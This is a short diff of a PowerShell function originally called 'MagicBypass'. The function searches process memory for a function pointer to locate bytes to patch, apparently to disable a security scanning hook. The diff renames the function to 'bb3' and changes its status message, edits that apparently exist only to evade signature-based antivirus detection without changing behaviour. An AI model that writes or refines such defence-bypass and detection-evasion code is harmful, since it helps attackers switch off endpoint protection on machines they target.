@@ -1,4 +1,4 @@
-function MagicBypass {
+function bb3 {
     :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
         [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
         $ReadedMemoryArray = [byte[]]::new($ReadBytes)
@@ -7,7 +7,7 @@ function MagicBypass {
         $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
         [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
         if ($PointerToCompare -eq $funcAddr) {
-            Write-Host "Found @ $($j) : $($i)!"
+            Write-Host "yayaya @ $($j) : $($i)!"
             [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
             break initialloop
         }
